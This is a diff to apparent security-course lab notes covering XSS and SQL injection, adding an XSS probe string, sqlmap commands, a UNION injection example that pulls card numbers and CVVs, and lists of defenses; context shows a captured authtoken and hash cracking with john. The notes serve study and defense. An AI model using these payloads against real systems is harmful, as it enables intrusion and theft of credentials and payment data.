@@ -195,7 +195,12 @@ Test additional operators like `&&` and `||` with arguments before and after to 
 
 ## 4.5 XSS Attack
 
-Uses the same vulnerable site as before, just the `Search` page.
+==__pgs: 53-61__==
+XSS test string for user input fields:
+
+```text
+'';!--"<>=&{()}
+```
 
 We can use the Developer Tools to see the output of searching for an input is not filtered --> vulnerable to XSS attack.
 
@@ -214,7 +219,19 @@ Press Ctrl-C to quit.
 [Fri Jul 15 19:32:51 2022] 172.30.0.45:44446 [200]: /?authtoken=77ba9cd915c8e359d9733edcfe9c61e5aca92afb
 ```
 
+### XSS Defenses
+
+1. User input filtering (especially 3rd party filtering libs)
+2. Use a framework that handles filtering for you
+3. WAF used as mitigation
+4. ModSecurity from Apache (free)
+5. Filter output as well as input
+6. Limit cookie accessibility with HTTPOnly flag
+7. Set Content Security Policy on servers to declare which specific dynamic resources to add
+
 ## 4.6 SQL Injection (SQLMap)
+
+==__pgs: 66-78__==
 
 ```bash
 sec504@slingshot:~$ sqlmap -u "http://rookaviary.com/email_search.php?search=" --dbs
@@ -280,11 +297,34 @@ john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/sqlmapmdAHnx3702/sqlmaphas
 RockYou          (ssims)   
 ```
 
+```bash
+sqlmap -u "http://url.com/page?param=" --forms
+```
+
+### SQL UNION Statement
+
+Allows you to chain SQL statements/ results of a prior statement with others.
+
+Ex:
+
+```sql
+SELECT uid, user FROM users WHERE user='jwright' UNION SELECT ccard, cvv from payments --
+```
+
+Most dbs requires the SQL statement following a `UNION` clause have the same number of columns as the preceding statement.
+
 ![sqli1](img/lab4/rook2.PNG)
 
 Sample SQLMap results:
 
 ![SQLMap1](img/lab4/rook3.PNG)
+
+### Defense against SQLi
+
+1. Parameterized stored procedures in web app (prevention)
+2. Limiting permissions of web app (limits impact)
+3. Monitor db query logging (needs to be turned on)
+4. ModSecurity from Apache
 
 ## 4.7 Cloud SSRF and IMDS Attack
 
